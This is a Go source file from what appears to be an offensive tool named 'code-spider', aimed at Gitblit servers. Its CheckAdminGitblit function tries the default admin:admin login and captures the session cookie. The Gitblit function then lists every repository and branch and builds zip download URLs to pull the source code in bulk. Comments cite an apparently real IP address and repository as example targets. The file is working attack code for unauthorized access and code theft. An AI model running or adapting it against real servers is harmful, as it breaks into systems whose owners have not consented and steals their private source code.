package core

import (
	"bytes"
	"code-spider/util"
	"fmt"
	"github.com/antchfx/htmlquery"
	"golang.org/x/net/html"
	"strings"
)

func Gitblit(target string, cookie string, gb bool) []string {
	download_list := []string{}
	if len(cookie) == 0 {
		cookie = CheckAdminGitblit(target)
	}
	url_api := target + "/repositories/"
	resp, err := util.DoGet(url_api, cookie)
	if err != nil {
		return nil
	}
	projectDoc, err := html.Parse(bytes.NewReader(resp.Body()))
	if err != nil {
		return nil
	}

	projectNode, err := htmlquery.QueryAll(projectDoc, "//a[@class='list']")
	if len(projectNode) == 0 {
		projectNode, err = htmlquery.QueryAll(projectDoc, "//a[@class=\"list\"]")
	}
	if err != nil {
		return nil
	}
	var urlNodelist []string
	var urlNamelist []string
	for _, urlNode := range projectNode {
		res := strings.Split(htmlquery.SelectAttr(urlNode, "href"), "/")
		node := res[len(res)-1]
		nodename := htmlquery.InnerText(urlNode)
		if !strings.Contains(node, nodename) {
			urlNamelist = append(urlNamelist, nodename)
			urlNodelist = append(urlNodelist, node)
			// fmt.Println(fmt.Sprintf("[+] 获取项目: %s 项目名: %s", node, nodename))
		} else if nodename == "" {
			urlNamelist = append(urlNamelist, strings.Split(node, ".")[0])
			urlNodelist = append(urlNodelist, node)
			// fmt.Println(fmt.Sprintf("[+] 获取项目: %s 项目名: %s", node, strings.Split(node, ".")[0]))
		}
	}
	urlNodelist = util.RemoveDuplicate(urlNodelist)
	for i, urlNode := range urlNodelist {
		if !gb {
			branch_api := target + "/branches/" + urlNode
			resp, err = util.DoGet(branch_api, cookie)
			if err != nil {
				return nil
			}
			projectDoc, err = html.Parse(bytes.NewReader(resp.Body()))
			if err != nil {
				return nil
			}

			projectNode, err = htmlquery.QueryAll(projectDoc, "//a[@class='list name']")
			if err != nil {
				return nil
			}
			for _, branch := range projectNode {
				branchname := htmlquery.InnerText(branch)
				fmt.Println(fmt.Sprintf("[+] 获取项目: %s 项目名: %s 分支: %s", urlNode, urlNamelist[i], branchname))
				// http://110.241.221.59:2001/zip/?r=cjhjpt.git&h=master&format=zip
				url := fmt.Sprintf("%s/zip/?r=%s&format=zip&h=%s&&name=%s-%s.zip", target, urlNode, branchname, urlNamelist[i], branchname)
				download_list = append(download_list, url)
			}
		} else {
			url := fmt.Sprintf("%s/zip/?r=%s&format=zip&h=master&&name=%s-master.zip", target, urlNode, urlNamelist[i])
			download_list = append(download_list, url)
		}
		// http://110.241.221.59:2001/zip/?r=cjhjpt.git&p=%E5%8C%BA%E5%8E%BF%E5%B9%B3%E5%8F%B0%E6%BA%90%E7%A0%81quxianweb/quxianweb&h=master&format=zip
		// url := fmt.Sprintf("%s/zip/?r=%s&format=zip&&name=%s-%s.zip", target, urlNode, urlNamelist[i], strconv.Itoa(i))
		// download_list = append(download_list, url)
	}

	return download_list
}

func CheckAdminGitblit(target string) (cookie string) {
	url := target + "/?wicket:interface=:0:userPanel:loginForm::IFormSubmitListener::"
	data := map[string]string{
		"wicket:bookmarkablePage": ":com.gitblit.wicket.pages.RepositoriesPage",
		"id1_hf_0":                "",
		"username":                "admin",
		"password":                "admin",
	}
	resp, err := util.DoPOST(url, data, "")
	if err != nil {
	}
	if resp.StatusCode() == 302 && strings.Contains(resp.Header().Get("Location"), "id1_hf_0") {
		cookie = strings.Split(resp.Header().Values("Set-Cookie")[1], ";")[0]
		fmt.Println(fmt.Sprintf("[+] %s admin:admin 登陆成功 cookie: %s", target, cookie))
		return cookie
	} else {
		return ""
	}
	return ""
}
